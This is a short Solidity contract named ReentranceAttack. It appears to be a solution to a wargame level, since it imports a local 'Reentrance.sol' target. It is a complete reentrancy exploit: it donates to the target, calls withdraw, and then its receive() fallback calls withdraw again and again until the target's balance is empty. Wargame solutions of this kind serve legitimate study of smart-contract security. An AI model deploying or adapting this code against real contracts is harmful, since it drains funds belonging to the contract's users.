// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Reentrance.sol";

contract ReentranceAttack {
  
    Reentrance _contract;

    constructor(address payable _adr) public payable {
        _contract = Reentrance(_adr);
    }

    function donate(address payable _adr) public {
        _contract.donate.value(1000000000000000)(_adr);
    }

    function withdraw(uint _amount) public {
    _contract.withdraw(_amount);
  }  

  receive() external payable {
      if(address(_contract).balance > 0){
        _contract.withdraw(msg.value);
        }
  }
}